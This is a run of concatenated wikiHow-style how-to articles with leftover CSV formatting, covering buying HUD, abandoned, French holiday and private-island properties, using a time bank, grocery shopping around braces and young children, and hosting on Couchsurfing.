period. The price is set according to an evaluation of the home's fair market value. During this period, only owner-occupants (those plan to live in the home rather than ""flip"" or invest in it) are able to bid on the home. After five days, all bids submitted to that point will be compared and the highest big will be chosen. If no bid is selected, bids are considered each day through the tenth day.


After this point, investors may make offers on the home. However, in some cases, investors may not be able to make offers until 30 days have passed.Offers may be lower or higher than the fair market value, depending on market conditions in the listing area and other factors., Mortgages are not offered by HUD, but must be obtained through a mortgage lender. Mortgage loans are also available through the FHA. In either case, the buyer must meet income and credit standards to prove that they can afford the mortgage payments. In some cases, the buyer might be able to assume the mortgage being paid by the previous owner of the home.HUD homes can also be purchased in cash. Just make sure to ask your agent about earnest money and proof of funds letters that may be required in this case., If your bid is accepted, your agent will receive further instruction from the HUD on how to proceed. You may have up to sixty days to close on the house, but some houses close in as little as thirty days. Be sure to submit any paperwork requested by the HUD. You will need to submit a pre-qualification letter with the sales contract that specifies:


Your ability to afford the cost of the home.
The type of financing you will be using (if any).
Any assets that have been verified for closing., In some cases, the HUD will help homebuyers with closing and escrow costs. They may pay up to 3 percent of the closing cost of the home, but this needs to be negotiated in the offer on the home. They will also sometimes pay the escrow fee, which can be between $300 and $900. This depends on the buyer's situation and their ability to afford these fees.The HUD may also pay your broker's commission."

For instance, if you plan on living in the home, you'll have to plan on making all the necessary repairs to make it livable. This will require a lot of money, so you'll have to keep the buying price low. If you intend to just sit on the house for a few years without making any repairs and try to sell it later, you can afford to pay a little more. Whatever your intentions are, make sure you have them figured out before you go on with purchasing the house.;
, While you may be able to get an abandoned house much cheaper than market price, it could still be an expense of tens of thousands of dollars, not to mention repair costs. Make sure you are in a financial position to be purchasing a house, or you could take a serious financial hit if the home is out of your price range. You should at least have enough cash for a down payment, otherwise you may be getting in over your head.Considering partnering up with someone else if you don't have enough of your own cash to spend right away. Then you can divide the profits after you sell or rent the house.

, If you buy an abandoned property, it will almost certainly need some repairs. This could end up costing more than the house itself, so it's essential to include an estimate of repair costs into your financial plan. Here is the typical cost of some common home repairs. Bear in mind that all jobs are different, and this is only meant as a general guideline.


New concrete: over $10,000. Abandoned homes often have cracked driveways or sidewalks. Concrete jobs are very expensive, and some estimates can go as high as $30,000 for extensive concrete laying.Roof repairs: $5,000-$12,000. Abandoned homes often have old, crumbling roofs. This will need to be repairs to prevent internal damage and potential collapses.Install new plumbing pipes: $100-$3,000. Plumbing jobs are difficult to estimate. A few leaky pipes won't cost much, while installing a new water main will cost thousands.Rewire the house: $1,000-$2,000. An abandoned house could have electrical problems and need wiring replaced to prevent fires.New paint: a few hundred to $2,000. Depending on the size of the house, a new paint job could cost a few thousand dollars.Replace flooring: $1,000-$5,000. The cost here will depend on whether or not the floor just needs finishing, or needs complete replacement., While you could try to buy and fix up an abandoned house alone, it would make your life much easier if you had a few key people helping you out. Try to locate these people before starting the purchasing process so everything is all set by the time you buy the house.A lawyer. There may be legal wrangling involved in buying an abandoned home, so you'll want a lawyer versed in real estate law to advise you on decisions.
A handyman. As you saw, home repairs are very expensive. If you have a friend or family member that knows a lot about repair work, you can save yourself some money by having him or her perform as many repairs as possible so you don't have to call in an expert.
An accountant. Buying and fixing a home is a big financial investment. It would help to have an accountant around to manage your finances and advise you on taxes, etc.

, If your intention is to resell the house, you'll maximize your profit by moving quickly once you buy it. If you hold onto the house for too long, taxes and other maintenance costs will add up. Over time, even if you sell the house, you won't make a profit if these supplementary costs have added up. Buy the house, make any necessary repairs, then plan to put it on the market., Sometimes finding an abandoned property is as easy as driving around your neighborhood. If you come across a house that looks dilapidated, with overgrown grass, mail overflowing from the mailbox, and no obvious signs of life, this house could be abandoned. If you come across one of these, you'll still have to go through several steps to find out if the house is indeed abandoned., Usually the county government has records on property ownership. You may be able to locate homes that have been abandoned by visiting this office. Inquire about whether they have a list of abandoned properties. This should be a matter of public record, so it will only be a matter of finding the right person to talk to.


There may not be information about abandoned houses specifically, but the county office will have records of delinquent taxes. This can tip you off to properties that may have been abandoned, and you can further investigate these addresses if you find they are very behind on taxes., Counties sometimes sell homes if the owners have neglected to pay property taxes. Search your county's website or ask at the executive's office if there are any auctions coming up. In this case, you don't have to go through the trouble of locating properties yourself., Sometimes homeowners facing foreclosure or financial troubles try to sell their homes quickly before resorting to abandonment. These will probably appear on realty sites with phrases like ""must sell"" and are often very cheap. Start by looking on realty sites to find these indications of a home under foreclosure.You could also consult with a realtor directly. Even if their firm isn't responsible for an abandoned house, realtors usually pay attention to the local real estate market. It's likely they'll know of abandoned houses in the area that you could investigate.

, Sometimes homeowners facing foreclosure choose to abandon the house abruptly. The foreclosure process can be a long one, so an abandoned house may be in some sort of legal limbo while the bank tries to repossess it. Consult banks in the area to see if they have repossessed any homes, or have started foreclosure proceedings. This will help you find houses that will soon be or already are on the market for below the market price. , Since abandoned homes are bad for property values and can lead to crime, concerned citizens often try to prevent this from happening. They sometimes form organizations that will try to buy or sell abandoned homes to keep the area appealing. If you live in an area that has been losing population and abandoned homes are a problem, there may be a local group that keeps track of abandoned homes. Do an internet search to see if there are any local groups who can help you, and contact them. , Different cities, towns, and counties might have different laws regulating property ownership. Do some investigating and find out what those laws are. This will help you find out if a property is legally abandoned.


Each state has a real estate board regulated by the Secretary of State. You can find state real estate laws on these websites.
Your county executive office will have information on property laws in your specific locality.
It would also be helpful to consult a realtor in your area, since they will be familiar with local laws.

, If you do come across a house that looks abandoned, you should first ask the neighbors around the house. Specifically, ask if they know the owner, if anyone lives there, when they left, how long they've been gone, and if they know if the occupants are coming back. Neighbors can confirm that a house's occupants haven't been seen for some time, and you can then move on to more official means of discovering if the house is abandoned., After talking with neighbors, you'll have to find out who officially owns the property, if anyone. This way, you'll be able to see the legal status of the house and plan how you will proceed next.


In some areas you can find real estate and property ownership records online. Try a service like qPublic.net and Propertyowner to see if you can locate the property owner without leaving your home.
Visit your local county executive office. Inquire here about who can help you locate the owner of a property. This will usually be the tax assessment office, since they are responsible for collecting all the property taxes. This investigation will show you who the last known owner of the house is., Even if a home has been abandoned, someone may still legally own it. Get as much information as you can from the county office and try to contact the owner. If you're successful, ask the owner if he is willing to sell the property. You can then begin negotiating with him to buy the house., If the owner has disappeared and you can't find him, contact the bank that granted the mortgage. You may find out that the house is currently in foreclosure. In this case, the bank is repossessing the home. You can then inquire about purchasing the house when the process is complete., Most abandoned homes have either already been foreclosed on or are in the process, meaning the bank is who you'll need to contact. It is possible, however, that the local government has condemned the building. In this case, the government may be selling the house off for tax money. If you find that this is the case, return to the county executive's office and see if the house is up for sale., If the home has been abandoned or foreclosed, there is a good chance it will require repairs if you buy it. Have an engineer go through the house and check the wiring, plumbing, and foundation. If these need repairs, get a quote on how much they will require to fix. You want to know exactly what you're getting into before you make a buy. If you're not careful, the house that you thought would be a great investment could turn out to be a costly liability., Depending on where your investigations have led, you could be dealing with the original owner, the bank, or the government. Approach whichever of these entities actually owns the home with an offer. Be sure to factor in the cost of repairs into your offer. You don't want to end up paying too much for the property when you know it needs several thousands of dollars of repair. After some negotiations, you'll hopefully come to a price that satisfies both parties.


If you're new to negotiating, read Negotiate for some good tips.

, Once you've gone through the investigative work, the process of buying an abandoned home is very similar to buying any other home. You'll need to approach a bank and get a mortgage to finance the house. Read Get a Mortgage for everything you'll need to know while going through this process.

Perhaps you want to live near the beach in the south of France, or near the Alps or Pyrenees mountains, or the great open expanses of the Massif Central. A holiday home is a major financial commitment and something that can give you a lot of pleasure, so take your time to explore the country and find out where you like best.


Think about the local culture, especially the food and drink.
Also consider the more practical things like transport links and affordability.Try to keep an open mind and see what places you feel most at home in.;
, Once you have come up with a few towns or areas that you like most in France, it’s sensible to rent a holiday home to get a feel for what it would be like to stay there. You might fall in love with a place if you just spend a night or two there, but spending a week or longer will give you a better idea of the daily life and culture.


You might discover that in practice it’s just too far from the sea, or the local wine isn’t to your liking.
Try to talk to people in the area and get a feel for what it would be like to have a holiday home there.Try to visit at the time of year that you would envisage spending in your holiday home.
This way you will get a good idea of the local climate and how busy or quiet it gets at different times of the year.

, You should spend some time researching property market trends in the different regions of France, as part of your research. Determine which areas are on an upwards curve, and which are on a downwards curve. Depending on your budget and your intentions, this information might help you to focus your search more closely.


If you are looking to buy as an investment you might favour somewhere where the market is buoyant.
If you are looking for a cheaper option to enjoy without thinking too much about a potential drop in value, a region with falling prices might be a more appealing option.
You can access up-to-date quarterly figures for each area online., Spend some time coming up with a firm budget before you start looking too closely at different property options. You budget should not just cover the price of the property, but also any likely renovations, as well as all the fees and taxes that you will have to pay. Prices vary widely, but it is possible to get a village cottage or terrace for around €100,000. A one or two bedroom apartment in a small town may be available for €50,000.


A larger house with multiple bedrooms and a swimming pool will cost upwards of €200,000.
An apartment in a less popular ski-resort could be available for €150,000.
You may find a run-down old rural cottage for as little as €25,000, but the renovation costs are likely to be at least this much again., After you have selected the area you would like to focus on, and have a clear idea about your budget, it’s time to draw up some criteria to work from. There are all sorts of thing you could include on your criteria, and it will depend on what you are looking for from your holiday home.Here are a few things you ought to consider:


Accessibility: determine what kind of public transport links you will require. Is there a convenient airport? Is there a train station with good connections?
Amenities: think about what local shopping and entertainment options there are. Will you have to drive everywhere, or are there things within walking distance?
Climate: do you want someone hot, or milder in the summer?
Community: are you looking to live amongst expats, or do you want immerse yourself within the local culture? Speaking French and getting involved in local cultural activities will really help you feel at home.
Crime: is there a high-rate of burglaries in the area? Think about the risks if you’re going to be away from the property a lot. Making friends with neighbours who can keep an eye on everything can be a big help.
Parking: if you are looking for a place in town, is there adequate space to park your rental car on the street or in a garage?, Drawing up some criteria will help you and whoever you are buying with come up with shared ideas about what your holiday home will be. It’s important that you communicate clearly and everyone has a common vision. If you want a house in the country, but your husband wants a city-centre apartment, you will have to work on a compromise., Look through brochures and websites to build up a long list of properties you might be interested in. Doing this will help you get an idea of average prices in the area you are looking, without you needing to be on the ground. It’s important to be thorough at this stage to make your actual viewings as efficient as possible. Some of the best places to look for property in France include:


Newspapers and magazines: if you are in France, national and local newspapers will have extensive property sections. There are specialist weekly property newspapers in France to look through. General property and retail magazines in your home country will also have listings.
The internet: the internet is the easiest and most efficient way to access the vast arrays of properties for sale in France. Look for specialist websites, and the sites of French real estate agents.
Property exhibitions: keep an eye out for property exhibitions being held near you. Often developers will hold events showcasing the properties they have available., Whittle down your list to a more manageable number before you plan a trip over to France to view the properties. Time will be tight if you have lots of place you want to look at, so you will have to be fairly firm when you are making your shortlist. Think about which properties meet the most of your criteria and work best within your budget.


Build a consensus amongst everybody involved and make sure there is something for everyone.
Don’t rush these decisions, and bear in mind that it might all change again once you actually go to view the properties.

, Book appointments through internet agents before you go if you have limited time to view. Agents can arrange for you to see the properties from the books of several agents immobiliers, (French estate agents) in one short visit. If you have more time, it makes sense to go visit the agents immobiliers individually as otherwise you will be restricted to the limited number of agents immobiliers that the Internet agent has an arrangement with.


French Estate agents' offices are now so common in France that you will find them even in some of the smallest towns.
As the purchaser, you will normally have to pay their fees but they are often included in the asking price.
If they are included, the price should have the letters F.A.I. attached, (Frais d’Agence Inclus).

, You should always try to view each property you are considering yourself, and preferably at least twice. Keep in mind that photographs can trick the eye, so it’s important that you see it for yourself and are able to actually walk around the property. Think about the location in relation to local amenities, and how easy it is to get to. Drive there yourself, and consider the surroundings as well as the property itself.Is the area more busy and built-up than you would like, or is it too remote and quiet?
Are there busy and loud roads within earshot?
Can you easily walk to local shops, or will you need to drive?
Is there plenty of light and sun, and how private is any outdoor space?

, Now it’s time to actually decide which property you want to go for. Talk it through with everybody and come to an agreement. Try to find a balance between what everybody is looking for and what properties meet most of your criteria. If you are uncertain, try to visit the properties again and make sure you have all the information you need. Before you make an offer, you should be able to answer the following questions:


When was it built?
Has it been used as a holiday home or a permanent home?
How long have the owners lived there, and why are they selling?
How long has it been on the market?
Does it require any work or renovations?
What is the neighbourhood like?
What are the local property taxes?
How realistic is the asking price?

, The French do not generally have a tradition of having surveys done when purchasing a house, but you can engage a chartered building surveyor to give you a report on the condition of the property. If you don’t speak French, there are some British surveyors working in France, type chartered building surveyors France into any search engine for a selection.


Be wary of businesses who are not chartered building surveyors, such as those that are chartered valuation surveyors may appear as 'sponsored links'.

, The legal aspects of the house purchase are handled by a notaire. He or she is a state employee, responsible to the government for the correct transfer of ownership and collection of associated fees and taxes. The vendor will certainly have their own notaire, but you should always appoint one to act on your behalf.


The fees do not change, and the two notaires will split the work and the fee, so there is no reason at all not to have two notaires involved.
As with the agent immobilier, the purchaser normally has to pay the notaire's fees.
Keep in mind that, although you are paying their fees, neither the agent immobilier nor the notaire are working for you or exclusively representing your interests.
Notaire fees will typically be around 7-9% of the purchase price of the property., In most instances, sellers are prepared to negotiate on price. If the property is a little above your budget, don’t be put off from putting in a lower offer to start with. As with any negotiation, it helps to have as much information and understanding as possible. For example, if you know that the property has been on the market for a long time and prices in the area have been on a downwards trend, this will strengthen your position.


Don’t expect big reductions, however. On average prices tend to come down by not more than 3% in negotiations.
Ask your agent for advice on how much to offer, but understand that she may not be able to suggest a price is she is working for the vendor too.

, Once you have a price, make an offer to the vendor. In France, if you make an offer with clear main terms, and the vendor accepts, a contractual commitment is considered to have arisen. You may then also be asked to make a formal written offer. Always ensure that your offer is conditional on a formal sale and purchase contract being prepared.


A deposit should never be asked for or paid at the time an offer is made. This should only happen once sale and purchase contract has been agreed and signed., After signing the initial contract, the compromis de vente for instance, you as the purchaser have a seven day cooling off period during which you can change your mind and withdraw your offer, unless you are considered to be investing in property as a business.You should also ensure that there are clauses in the compromis de vente that will dissolve the contract in case of problems.


Visit the property on the way to the notaire's office to check that nothing has changed before you sign the final contract, (acte de vente).
The acte de vente states that the property is sold as it exists on the day of the signing.

Consider making a list of all of the features you absolutely need, and a separate list of features you would like, but are willing to compromise on.


Think about how large of an island you need. If you just want a simple cottage and a private beach, you may be comfortable with a few acres, but if you are planning to develop a resort, you will need a much larger island.
Think about what kind of buildings you need. If the buildings do not already exist on the property, be sure to look into building regulations before you purchase the island.
Think about the kind of landscape you are looking for. Some islands may have white sandy beaches, while others may have cliffs and dense jungles.
It's also important to think about the type of beaches the island has to offer. For example, you may prefer sandy beaches to rocky beaches, or you may prefer a beach that faces the west if you want to watch the sun set. You may also want to think about whether the water immediately surrounding the island is good for recreational hobbies that you enjoy, like scuba diving or fishing.;
, Location is probably the most crucial factor you will need to consider when buying a private island. Be sure to do plenty of research and choose a location that truly meets all of your needs. .


Climate is a huge consideration, so make sure you understand what the weather is like year-round. Find out if the area is prone to extreme weather like monsoons or hurricanes.
Determine how far away from civilization you really want to be, keeping in mind that being completely isolated may make it difficult to get supplies and get help in the case of an emergency.
Also think about the towns or cities that are closest to your island. If you think you might need or want to leave the isolation of your island from time to time, it's best if you enjoy the cultural amenities that the local area has to offer.

, Think carefully about how much you can reasonably afford to spend on your own private island, and do your best to stick to your budget. If you can't afford what you really want just yet, consider waiting until you can rather than settling for a less expensive island that doesn't meet your needs.


When deciding on a budget, keep in mind that you might have a very hard time getting financing for a private island. Banks are often wary about lending money for these purchases because islands are extremely difficult to appraise. If you choose an island that is close to a well-developed area, you will have more luck getting financing than if you choose a remote island.If you plan on building on your island, it's a good idea to start working with an architect and contractor right away so you have a good understanding of what the costs will be. Building on remote islands is much more expensive than building in a developed area because it's difficult to get all of the materials to your build site.When setting your budget, be sure to consider the costs of traveling to and from your island, maintaining your island, and making any necessary improvements.

, You may just be looking for your own personal escape, but if you are thinking about renting your island out to guests, you may have a great way of earning extra income. If this is your plan, there are some additional considerations to take into account, so be sure to do your research and ensure that the island you are looking at will indeed work as a rental property.Work with your lawyer to ensure that you will be legally permitted to rent out your island for short periods of time.
Think about how guests will get to your island. If it is very remote, you may need to offer to arrange for transportation.
Consider what kind of services you will need to offer for your guests. For example, if the island is remote, you will probably have to offer a cook to prepare meals. You may also want to offer recreational activities.

, If you're looking at undeveloped islands, they will most likely not have any utilities. When developing your island, you will need to invest in systems that allow you to bring the comforts of modern living to a remote area, which can be very expensive.If the island doesn't have electricity, you will need to invest in a solar system and maybe a backup generator.
If the island doesn't have a source of fresh water, you will probably need a special purification system to make seawater or rainwater potable. These systems can cost hundreds of thousands of dollars, so be sure to do your research before you finalize your purchase.Creature comforts like cable and cell reception may be very hard to come by if you are far from civilization.

, When choosing the perfect island, it's important to consider how you will get there. Consider whether you will need to take a commercial flight to get near your island or if you can drive. Once you are in the general vicinity of your island, think about whether you will be able to take your own boat to the island or if you will need to charter a plane.Think carefully about how much it will cost to get from your primary residence to your island and back. If it is too expensive, you may not end up spending as much time there as you would have liked.
Be sure to consider how long you will be able to spend on your island during each visit as well. If you want to go for the weekend, it's best to choose an island closer to home, but if you plan on spending months at a time on your island, a 14-hour flight might be no big deal.
Remember that water depth is very important. If the water around the island is too shallow, you may not be able to get there in certain vessels unless you dredge the area or build a large dock. It's important to see the island at high and low tides so you understand the true accessibility., If you are buying an island with existing infrastructure, it's important to have a thorough inspection to make sure everything is in good working order. It's always best to have a good idea of what repairs will be needed before you purchase any property.


In addition to assessing the structures, your inspector should take a close look at the existing utilities. Repairs to these systems can be extremely expensive.
It's also a good idea to confirm that the buildings have all necessary government permits.

, Some islands have very delicate ecosystems that can be disturbed by construction. For this reason, there may be some restrictions on what you are allowed to build and where. To be safe, it is a good idea to have the seller obtain the necessary governmental approvals for the kind of development you are interested in. You should also consider hiring a professional to conduct and environmental impact study.Some islands may have protected areas if, for example, endangered species inhabit the area. This would prevent you from building any structures on that part of the island.Be sure to consider non-legal restrictions as well. For example, you should find out how high the water has been known to rise in order to avoid building your house in an area that is likely to flood.

, Depending on what you plan on doing with your island and where it is located, you may need to obtain permits from the government. It is a good idea to find out about what permits are required and what the process is for applying before you purchase the island.You may need a building permit if you want to construct a new building on the island or modify an existing building. There may be certain restrictions regarding the size of the buildings you are allowed to construct or the manner in which they must be constructed.
You may need additional permits or licenses if you plan on running any kind of business from your island.

, Depending on the location of your island and the amount of maintenance it requires, you may need to hire a caretaker to look after it when you are not there. Since an island is isolated, it is hard to protect against unwanted visitors and squatters without one. A caretaker can also look after buildings and equipment, making sure they're all in good order and condition., In order to start shopping for a private island, you will need to work with a real estate broker. Choose a broker who has a lot of experience in buying and selling private islands, as these properties pose unique challenges to buyers. If you don't know of any brokers, you can search for one and read reviews online.You can search listings for private islands online, just like you can for other types of real estate, but not everything is listed online. Your broker will have access to all of the listings, both public and private.

, If you are thinking about buying a private island outside of your country of residence, it's a good idea to consult with an experienced attorney. Laws regarding property ownership and residency vary dramatically from country to country.In some countries, non-citizens are not permitted to buy land outright, but are permitted to purchase long-term leaseholds for periods of up to 99 years.
Some islands may also have strict environmental codes that restrict you from developing on them., You will probably need to devote a lot of time to viewing different properties when you are shopping for an island. Your broker will take you to see islands that meet your criteria, and you will need to choose the one that works best for you.Don't be too surprised if you are unable to fly to a property when you planned to due to bad weather. These kinds of delays are par for the course when you're dealing with remote islands.
Consider bringing along a trusted friend or relative to help you evaluate your options.
Never buy an island without seeing it first! There are all sorts of surprises that may not be evident in the listing pictures.

, It can be tricky to determine whether the price of an island is fair or not because not many are bought and sold, so you may not have much to compare the price to. Work with your broker to evaluate comparable properties as much as possible.At the end of the day, it's most important that the island is worth the price to you, so don't pay more than you are comfortable with.
Try not to get too emotional about this decision. If the island is over your budget or doesn't have the features you are looking for, keep looking.

, Once you find the island of your dreams, it's time to make an offer. The exact process for conducting a real estate transaction will depend on the island's location, but your broker will guide you through the process.


If you think the island is over-priced, you can offer a lesser amount. The seller has the option to accept your offer, decline it, or counter your offer with a new one.

",How to Use a Time Bank,"


Start with the directory on Time Banks USA Time Banks USA. Although ""USA"" is in the website name, the directory also includes timebanks from the Canada and other countries.
If you don't find your time bank listed on the Time Banks USA site, it's worth doing a Google search to see if there's a time bank in your area. No all time banks are listed in the Time Banks USA directory.;
,


Time banking is built on trust, and often involves visiting the homes of other members. That's why most time banks do reference checks.

,,


At timebank orientation, you will learn how time banking works, how to make requests and offers, as well as how to use the timebank software.
You can attend the time bank orientation even if your application is not complete.
Most time banks will inform you about orientations via email, newsletters, or social media pages.

,, Time banks host potlucks and other events so members can meet each other and build trust. You can usually attend potlucks even if you haven't applied yet. If you bring something, you will get a time dollar.

, Most time banks will give you a time credit for attending orientation. Recording this hour gives you a chance to practice reporting your hours.


There are several different types of time bank software, but most time banks use Hourworld or Community Weaver.
If you have problems using the software, contact a time bank coordinator. They are there to help, and want everyone to be able to make the most out of the time bank.

,


It helps to be specific. If requesting a meal, for example, you will be more likely to get what you want if you specify things like the type of cuisine, dietary restrictions, whether or not you need the meal delivered to your home, how many people you are feeding, etc.
If you are stuck on what to offer, think about what you enjoy or miss doing. You can also ask the time bank coordinator for ideas if you are stuck. Some time banks even offer inventories or surveys to help people brainstorm ideas for exchanges.

Remember that the pain caused by having braces tightened should only last around one week or less.,
Avoid buying chewy or hard foods.,
Avoid buying food that will get between braces.,
Buy melt-in-the-mouth foods.,
Buy very soft foods.,
Buy mashed food.,
Take the braces wearing person with you when you go shopping.",How to Grocery Shop for Someone Who Just Had Their Braces Tightened," It is possible, but unlikely, that the pain will last over one week. Keep this in mind when you are shopping if you don't want to buy brace-friendly food in bulk. The member of your family who has braces should be able to eat normal food one week after they have had their braces


Keep in mind that after eating hard foods, the brace-wearing member of your family can suffer severe aching in the teeth after eating non brace-friendly foods in the week after they have had their braces tightened, or find it impossible altogether. Completely avoid serving the member of your family with braces hard foods during this time. If the brace-wearing person is suffering severe pain, depending on their age, give them a pain relief medicine such as Calpol or painkillers to relieve the pain.;
, The brace wearing person will find it impossible to eat chewy or hard foods during this time. Particular foods to avoid are the list below. The foods highlighted in bold are foods that are recommended that you eat none or very little of the whole period in which braces are worn. This may seem like a long list but remember, the person who has braces should be able to eat almost all of these after one week.


Toffees
Nuts
Apples
Hard breads (baguettes, hard buns, etc.)

Chewy or hard sweets (excluding chocolate)
Mints
Biscuits
Carrots and other hard vegetables
Hard or chewy pastries (croissants etc.)
Samosas, pappadums
Chicken (if it is on the bone) and other chewy meats, such as steak and pork.

, This is a problem for many brace wearers, because not only is it unsightly, food stuck between braces can cause pain. The foods to avoid are:


Nuts
Apples
Couscous (and foods like it, excluding rice)
Bread
Carrots and other hard vegetables
Chewy sweets

, Brace wearers will find it easier to consume melt-in-the-mouth foods because it minimizes chewing. These can be foods such as:


Chocolate
Various puddings (such as melt in the middle pudding, or easy to break apart puddings like sponge.)
Any other melt in the mouth foods.

, Make sure that there are no hard bits in the food that you buy, even if it is soft, to minimize the possibility of chewing and getting hard bits stuck in the braces. This can be:


Cheese
Soft chips
Beans and peas (and foods like it, including sweetcorn)
Rice
Pasta
Mince
Softened potatoes
Sausages
Brussels sprouts and other soft vegetables

, You don't need to buy baby food for this step, so don't worry. Just buy mashed or liquidized foods that are easy to eat. Ideas to try are:


Mashed potato
Mushy peas
Rice pudding
Ice cream
Soup
Jelly

, Ask them for foods you're unsure about: ""Can you eat this?"" The brace wearing person should know what he or she can or cannot eat. Make sure that the person is reliable, though. You have to question their judgement when the person says that they 'can't eat' brussels sprouts or any other vegetable and 'can eat' chewy sweets and other unhealthy foods.

Pick a time when your child will be happy and awake.,
Plan your route to the grocery store in advance.,
Make a shopping list.,
Set expectations for your child.,
Avoid grocery shopping when your child is hungry.,
Use a game to teach your child about grocery shopping.,
Consider other options.",How to Grocery Shop with a Young Child1," If your child takes a nap around 1pm every day, don’t start your grocery shopping at 12:30. Pick a time when your child is alert, fed, and happy.


If needed, bring snacks and drinks in the car to avoid bringing a cranky, hungry child to the grocery store.;
, If you plan on going to multiple stores, plan your route ahead of time. If needed, plan breaks with fun activities for your child, such as stopping at the park next to one of the stores. If those extra stops come after you’ve purchased your groceries, don’t forget to bring a cooler in the car to keep your perishable goods cold.


You should also consider the weather if planning outdoor breaks with your child, as stopping on hot or rainy days could make for a less than ideal play time.
Be prepared to potentially miss some stores if your child becomes extremely cranky or tired. Plan your most important stops first, so in case you do need to abandon your errands, you at least get done what you most need to do.

, When shopping with kids, time is valuable which means you can’t waste time wandering the store or pondering what to get. Make a detailed shopping list ahead of time so you have a clear plan of action.


If needed, organize your list by location in the store, so that you can work your way through the store to get everything you need. If you have coupons or other vouchers, make sure that those are organized as well so you can quickly grab what you need.
Creating a shopping list not only helps you avoid making unnecessary trips to the store because you forgot something, it also helps save money by giving into less impulse buys. To avoid your child wanting to buy unnecessary items and treats, make sure he knows that you will be buying only the items on the list. You could even let him pick out something to put on the list so that he more readily accepts the list as final.

, If your child doesn’t know what is expected of him, explain to him what the grocery store is like, and how you expect him to behave.


Before you leave for the store, explain to your toddler what is happening. Be clear and say things like “We are going to the store. It should only take 20 minutes if you are good. I need you to stay by me in the store”.
The rules will be dependent on what you want to do as a parent and what your child can handle. Possible rules include staying near mom, not touching items on the shelves, not running in the store, or always having a hand on the cart.
Having consistent rules each time you go grocery shopping will help your child associate the store with behaving. Reiterate those rules before every shopping trip to instill them in your child.

, Make sure that your child has eaten a healthy snack before you shop. This is to avoid him from asking you to buy something; if your child is hungry at the store, he is more likely to crave everything that he sees.You can also consider bringing a reusable water bottle with you so that you do not have to buy your child an unhealthy drink every time he gets thirsty.

, Set up a small table and place items on it that you would normally buy in a grocery store. Arrange them into groups based on where in the store you will find these items. Use fake money to practice buying and selling things with your child.


Pretend that you are the seller. Have your child pick out items he wants to buy and put them in a ‘grocery basket’ (this could be a regularly bag). Alternatively, have your child be the one selling the goods, and ask to buy them from him. Playing with the fake money can also help your child to become familiar with numbers.

, If your child tends to misbehave at the grocery store, consider not bringing them along so that your shopping can be more efficient. If possible, leave your child with a friend or neighbor, or grocery shop during times when your spouse is home to watch your child.


If you have friends in similar situations, take turns grocery shopping and watching each other’s kids.
Some grocery stores even offer free child sitting while the parents shop, which is a great option if you are in a hurry or need to get a lot of items.

"
"
Check if the grocery store has a cart designed for your toddler.,
Get your child involved in the grocery shopping.,
Send older children off to find specific items.,
Give your child a specific responsibility.,
Turn the shopping trip into a learning opportunity.,
Reward your child for good behavior.",How to Grocery Shop with a Young Child2," Some stores have a grocery cart that includes a seat for your toddler. However, these seats are not always considered safe. As an alternative, you can buy a seat insert that will hold your child securely and comfortably.


Children should not push carts by themselves unless it is a child-sized cart. Some grocery stores have mini-carts that your child can push behind you while you shop. Giving your child this responsibility of pushing his own cart may help him to behave properly.

, Make your child feel like he is helping by involving him in the shopping process. Doing this will make the time go faster and can become a valuable learning experience for your child.


Make a shopping list for each child and have them cross off items as they are placed in the cart. For younger children sitting in the cart who cannot read, this can be as simple as printing or drawing pictures of a few basic grocery essentials, such as milk, bread, or apples.
Older children can write out their own list and cross things off as they are found.

, If you are comfortable letting an older child out of your sight, consider having them find a few items on the list by themselves.


The safest way to do this is to stay on the same aisle as your child, but to have him look for a specific brand or ingredient. This not only keeps your child entertained but also teaches reading and learning skills.
Make sure you are very specific with your child about what ingredient you want him to find, otherwise your trip could take much longer as you replace everything your child found.

, Put your child in charge of something, such as the coupons or the shopping list. This will give him a sense of responsibility and will help your trip to stay organized.


Use your judgment to give your child a job that he can manage. If you are shopping with multiple children, have an older child be in charge of a younger child by making sure they are behaving and helping them if they need anything.

, You can turn the grocery trip into a learning opportunity by playing games around the store. For example:


Have your child count the number of bananas in the bunch, play I Spy to have him search for letters or words, or have him identify the colors of certain foods.
Older children can help with the math and can add up the cost of certain items or figure out which item is least expensive. Tailor the games to your child’s learning levels and interest.

, As stressful as a shopping experience is for a parent, it can be even more stressful for a child. If your kid did a good job, be sure to praise him and perhaps even give him a reward.


Praising your child for a job well done will boost his confidence and make it more likely that he will behave well during the next shopping trip.
Possible rewards could be picking out a favorite treat to take home, or rewarding him with extra play time when you get home. Use your judgment to decide what will work best for your child.

Plan the timing of your shopping trip to avoid crowds and empty bellies.,
Communicate your expected behaviors.,
Make a list.,
Bring snacks.,
Put the kids to work.,
Educate your kids while you shop.,
Look for opportunities for physical activity.,
Thank your children for their help.,
Ask your kids to begin preparing a list for the next shopping trip.",How to Go Shopping with Kids,"


Go to the grocery store in the morning after breakfast or in the early evening after dinner. Go to the mall on a weekday instead of the weekend.;
, Before you even get into the car, explain to your kids what you expect from them at the store. Ask if they understand.

, Prepare a shopping list, and ask for input from your children. This will keep your shopping on track and will cut down on impulse buying.


Allow your children to carry their own lists. For example, if you need to buy them shoes or you promised them ice cream, allow them to write down those items on their list.
Ask your children to check the list if they want you to buy something that is not on there. Explain that you will add it to the list the next time you shop. This will help them understand why you are saying no, and will teach them delayed gratification.

, Avoid tantrums and meltdowns with a few healthy snacks. Pack a baggie of carrot sticks or grapes to keep little kids busy and fed.

, Give your children age-appropriate tasks.


Send older kids off on their own to locate items on your list.
Ask school-aged kids to cross items off the list as you put them in your shopping cart or basket. You can also have them read you which items are next on the list.
Let younger kids help by counting the number of items you ask for, such as apples, or taking packages off the shelf and putting them into the cart.

,


Ask your young readers to read you food labels or price tags on clothing. Younger kids can even look for specific letters and numbers.
Have your older children comparison shop. Ask them to find you the best deals on certain items. This will help them learn how to budget.
Encourage questions. Children can work on their social skills and learn new things by talking to sales associates and professionals in different sections of the grocery store.

,


Ask your children to help you load groceries or shopping bags into the car and then into the house. Let them help you put things away when you get home.

, Reinforce good behavior by acknowledging it.

, They can include any approved items that they wanted to get on that day, but were denied.

Meet your couchsurfer.,
Show your couchsurfer in.,
Tell your couchsurfer about the area.",How to Host on Couchsurfing," It's called ""couchsurfing"" because you do not need a dedicated spare bedroom to host. A couch will do. So will a floor mat or air mattress and a spot in the living room. Some couchsurfers even choose to travel with camping gear, and may willingly pitch a tent in the back yard.;
,,

, You can also choose that you just want to hang out, or that you're currently traveling.

, If you don't find anyone, make your search parameter wider, or choose a larger town.

, Upload a picture, and say a little about yourself. It will help everyone concerned if they know what to expect.

, Depending on how popular your area is for visitors, you may get requests right away, or it may take many months.

,, Good communication can make everything much easier both on you and your couchsurfers.


